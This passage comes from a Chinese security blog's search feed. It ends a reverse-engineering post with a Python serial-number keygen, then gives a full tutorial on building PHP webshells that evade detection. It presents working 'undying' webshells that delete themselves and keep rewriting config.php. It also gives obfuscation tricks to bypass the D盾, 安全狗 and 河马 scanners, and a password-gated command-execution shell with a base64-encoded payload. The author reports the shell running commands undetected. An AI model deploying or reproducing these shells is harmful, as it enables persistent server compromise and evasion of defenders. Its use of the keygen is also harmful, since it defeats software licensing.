class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>(<span class="hljs-params">uname</span>):<br>    length = <span class="hljs-built_in">len</span>(uname)<br>    <span class="hljs-keyword">if</span> length &lt;= <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;用户名长度必须大于4&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">list</span> = [<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x0C</span>]<br>        index = <span class="hljs-number">0</span><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        op_str = uname[<span class="hljs-number">3</span>:]<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> op_str:<br>            <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-built_in">list</span>[index])<br>            index = (index + <span class="hljs-number">1</span>)%<span class="hljs-number">5</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;序列号为&quot;</span>,<span class="hljs-built_in">sum</span>)<br><br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--username&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;input your username&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>)<br>args = parser.parse_args()<br>uname = args.username<br>reg(uname)<br></code></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270005315.jpg" alt=""><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270005306.jpg" alt="">]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>简单</tag>
      
      <tag>破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的php一句话免杀不死马编写</title>
    <link href="/2022/11/02/%E7%AE%80%E5%8D%95%E7%9A%84php%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%85%8D%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%BC%96%E5%86%99/"/>
    <url>/2022/11/02/%E7%AE%80%E5%8D%95%E7%9A%84php%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%85%8D%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p>主要是丰富一下编写木马的一个经历。尝试一下绕过D盾、安全狗、河马。</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>php的不死马不算真正意义上的内存马，并非直接加载在内存中执行的，而是通过快速删除文件，让进程在内存中做死循环不断创建和删除木马本身，来达到‘不死’的目的。</p><h3 id="原型分析"><a href="#原型分析" class="headerlink" title="原型分析"></a>原型分析</h3><?php  set_time_limit(0);  ignore_user_abort(1);  unlink(__FILE__);  while (1) {  $content = '<?php @eval($_POST["w9s"]) ?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;  <br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;w9s&quot;]) ?&gt;&#x27;</span>;  <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>set_time_limit()</code> — 设置脚本最大执行时间</li></ol><p>设置允许脚本运行的时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒。最大的执行时间，单位为秒。如果设置为0（零），没有时间方面的限制。</p><ol start="2"><li><p><code>ignore_user_abort(1)</code>函数设置与客户机断开是否会终止脚本的执行。该语句意味着用户停止访问该php文件时，php仍然执行。</p></li><li><p><code>unlink(_*FILE*_)</code> 删除该文件。</p></li><li><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。</p></li><li><p><code>usleep()</code>函数延迟代码执行若干微秒。</p></li></ol><h3 id="河马绕过思路"><a href="#河马绕过思路" class="headerlink" title="河马绕过思路"></a>河马绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &gt;= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]) &#123;<br>  <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&#x27;syst&#x27;</span>.<span class="hljs-string">&#x27;em(&quot;&#x27;</span>;<br>  <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&#x27;&quot;);&#x27;</span>;<br>  <span class="hljs-variable">$shell</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$prefix</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-variable">$suffix</span>);<br>&#125;<br><span class="hljs-variable">$bypassCmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$bypassCmd</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>河马可以通过字符串拼接和动态传参的方式绕过。</p><h3 id="安全狗绕过思路"><a href="#安全狗绕过思路" class="headerlink" title="安全狗绕过思路"></a>安全狗绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;getCmd&#x27;</span>,<span class="hljs-variable">$cmd</span>));<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>安全狗的检测与河马不同的一处是：有的时候只要<code>eval()</code>的参数是变量，就报毒，但并没有禁用<code>call_user_func()</code>函数，因此可以调用自定义函数绕过。</p><h3 id="D盾绕过思路"><a href="#D盾绕过思路" class="headerlink" title="D盾绕过思路"></a>D盾绕过思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmder</span></span>&#123;<br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$w9s</span>;<br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$length</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span> </span>) </span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;w9s = <span class="hljs-variable">$cmd</span>;<br>     <span class="hljs-variable language_">$this</span>-&gt;length = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;w9s);<br>   &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmder</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w9s&#x27;</span>];<br><span class="hljs-variable">$runer</span> = <span class="hljs-title function_ invoke__">getCmd</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$runer</span>)),<span class="hljs-number">30</span>,<span class="hljs-variable">$runer</span>-&gt;length)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>D盾和河马差不多，主要通过变换进行绕过，光是substr使用一次即可绕过。但也可以做更复杂的变换，如反序列化等。上述的代码结合了两种的使用。</p><h3 id="普通免杀一句话木马编写"><a href="#普通免杀一句话木马编写" class="headerlink" title="普通免杀一句话木马编写"></a>普通免杀一句话木马编写</h3><p>难点在于如何将几种方式运用在不同的地方，如何将这几种方式组合起来使用，主要的目的还是混淆变量的来源。这几款杀软都没有进行严格的语法树解析，所以要尽可能让变量的来源变得复杂（可以通过各种方式，类、函数返回、多重函数嵌套、序列化等）。需要注意的是无论是<code>call_user_func()</code>和<code>call_user_func_array()</code>函数的用法。以下是代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startCmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmder</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cleanStr</span></span>&#123;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$newsystem</span> = <span class="hljs-string">&quot;sys&quot;</span>.<span class="hljs-string">&quot;tem&quot;</span>;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$serilCmd</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;serilCmd = <span class="hljs-variable">$cmd</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])===<span class="hljs-string">&quot;df0f6c4b59db5fb7f4acf8b342994be0&quot;</span>) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmder</span></span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$command</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$seril</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$finalCmd</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$cmd</span>;<br>       <span class="hljs-variable language_">$this</span>-&gt;seril = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cleanStr</span>(<span class="hljs-variable">$this</span>-&gt;command);<br>       <span class="hljs-variable language_">$this</span>-&gt;finalCmd = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;seril),<span class="hljs-number">39</span>,<span class="hljs-number">6</span>).<span class="hljs-string">&quot;(&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;seril),<span class="hljs-number">67</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;command)).<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evalCmd</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;finalCmd.<span class="hljs-string">&quot;;&quot;</span>);<br>     &#125;<br>  &#125;<br><br>  <span class="hljs-variable">$cmdHandler</span> = <span class="hljs-title function_ invoke__">startCmd</span>(<span class="hljs-variable">$cmd</span>);<br>  <span class="hljs-variable">$noneMean</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmdHandler</span>,<span class="hljs-string">&#x27;evalCmd&#x27;</span>),<span class="hljs-keyword">array</span>());<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先介绍一下两个类，Cmder类用于储存、变换、并执行用户的指令，$command用于储存指令、 $seril用于存储cleanStr对象实例、$finalCmd用于存放最终要执行的指令。cleanStr类用于存放’system’该字符串和用户的指令字符串方便后续用反序列化取出达到‘clean’混淆来源的作用。</p><p>执行解析：</p><p>木马的密码正好可以作为动态传参的一个点。当传入正确的密码和指令时，才会继续向下执行，否则退出。然后调用<code>startCmd()</code>函数创建一个对象实例并返回给变量<code>$cmdHandler</code> ,在创建实例的时候，<code>__construct()</code>函数会自动调用，创建cleanStr对象并使用serialize()和substr()函数来拼接最终需要执行的指令。接下来会调用call_user_func_array()函数间接执行Cmder中的eval()函数，起到命令执行的效果。</p><p>执行效果：执行dir命令。三款杀软的查杀也没有报毒。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/0.png" alt=""><h3 id="不死马免杀一句话编写"><a href="#不死马免杀一句话编写" class="headerlink" title="不死马免杀一句话编写"></a>不死马免杀一句话编写</h3><p>将不死马的特点运用到上面的技巧中。不死马的特征本身是不会被检查的，真正有危害的是不断生成的php文件,只需要将不死马写入的文件，改成免杀的文件就行了。用base64编码一下，写入的时候在解码一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;PD9waHAKZnVuY3Rpb24gc3RhcnRDbWQoJGNtZCl7CiAgcmV0dXJuIG5ldyBDbWRlcigkY21kKTsKfQoKY2xhc3MgY2xlYW5TdHJ7CiAgdmFyICRuZXdzeXN0ZW0gPSAic3lzIi4idGVtIjsKICB2YXIgJHNlcmlsQ21kOwogIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjbWQpIHsKICAgICR0aGlzLT5zZXJpbENtZCA9ICRjbWQ7CiAgfQp9CgokY21kID0gJF9HRVRbJ2NtZCddOwppZiAobWQ1KCRfR0VUWydwYXNzJ10pPT09ImRmMGY2YzRiNTlkYjVmYjdmNGFjZjhiMzQyOTk0YmUwIikgewogIGNsYXNzIENtZGVyewogICAgIHZhciAkY29tbWFuZDsKICAgICB2YXIgJHNlcmlsOwogICAgIHZhciAkZmluYWxDbWQ7CiAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGNtZCkgewogICAgICAgJHRoaXMtPmNvbW1hbmQgPSAkY21kOwogICAgICAgJHRoaXMtPnNlcmlsID0gbmV3IGNsZWFuU3RyKCR0aGlzLT5jb21tYW5kKTsKICAgICAgICR0aGlzLT5maW5hbENtZCA9IHN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSwzOSw2KS4iKCciLnN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSw2NyxzdHJsZW4oJHRoaXMtPmNvbW1hbmQpKS4iJykiOwogICAgIH0KCiAgICAgZnVuY3Rpb24gZXZhbENtZCgpewogICAgICAgZXZhbCgkdGhpcy0+ZmluYWxDbWQuIjsiKTsKICAgICB9CiAgfQogIAogICRjbWRIYW5kbGVyID0gc3RhcnRDbWQoJGNtZCk7CiAgJG5vbmVNZWFuID0gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJGNtZEhhbmRsZXIsJ2V2YWxDbWQnKSxhcnJheSgpKTsKfWVsc2UgewogIGV4aXQoKTsKfQo/Pg==&#x27;</span>);<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-variable">$content</span>);<br>      <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>实际上在填入base64编码后的不死马也会被安全狗某条规则命中导致被查杀，其他两款都不会检测到，所以再针对安全狗对不死马进行修改。有了上面的经验就知道安全狗用一个call_user_func()就可以绕过。所以最终版本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retStr</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;PD9waHAKZnVuY3Rpb24gc3RhcnRDbWQoJGNtZCl7CiAgcmV0dXJuIG5ldyBDbWRlcigkY21kKTsKfQoKY2xhc3MgY2xlYW5TdHJ7CiAgdmFyICRuZXdzeXN0ZW0gPSAic3lzIi4idGVtIjsKICB2YXIgJHNlcmlsQ21kOwogIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRjbWQpIHsKICAgICR0aGlzLT5zZXJpbENtZCA9ICRjbWQ7CiAgfQp9CgokY21kID0gJF9HRVRbJ2NtZCddOwppZiAobWQ1KCRfR0VUWydwYXNzJ10pPT09ImRmMGY2YzRiNTlkYjVmYjdmNGFjZjhiMzQyOTk0YmUwIikgewogIGNsYXNzIENtZGVyewogICAgIHZhciAkY29tbWFuZDsKICAgICB2YXIgJHNlcmlsOwogICAgIHZhciAkZmluYWxDbWQ7CiAgICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGNtZCkgewogICAgICAgJHRoaXM&#x27;</span>.<span class="hljs-string">&#x27;tPmNvbW1hbmQgPSAkY21kOwogICAgICAgJHRoaXMtPnNlcmlsID0gbmV3IGNsZWFuU3RyKCR0aGlzLT5jb21tYW5kKTsKICAgICAgICR0aGlzLT5maW5hbENtZCA9IHN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSwzOSw2KS4iKCciLnN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSw2NyxzdHJsZW4oJHRoaXMtPmNvbW1hbmQpKS4iJykiOwogICAgIH0KCiAgICAgZnVuY3Rpb24gZXZhbENtZCgpewogICAgICAgZXZhbCgkdGhpcy0+ZmluYWxDbWQuIjsiKTsKICAgICB9CiAgfQogIAogICRjbWRIYW5kbGVyID0gc3RhcnRDbWQoJGNtZCk7CiAgJG5vbmVNZWFuID0gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJGNtZEhhbmRsZXIsJ2V2YWxDbWQnKSxhcnJheSgpKTsKfWVsc2UgewogIGV4aXQoKTsKfQo/Pg==&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;retStr&#x27;</span>,<span class="hljs-keyword">array</span>())));<br>      <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问config.php就可以正常使用了。效果截图：</p><p>busi.php不断生成config.php（真正的木马）。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/1.png" alt=""><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/2.png" alt=""><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/3.png" alt=""><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/4.png" alt=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路受益于deelmind。就写一点php木马也并非广而熟知的“免杀”，免杀领域是一门大学问。真正学习免杀的方法并不应该这样盲目的尝试，随着检测技术和对抗技术的发展，免杀领域会越来越高深。上到人工智能、深度学习，下至逆向分析、二进制。总之，要学习的东西还有很多。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
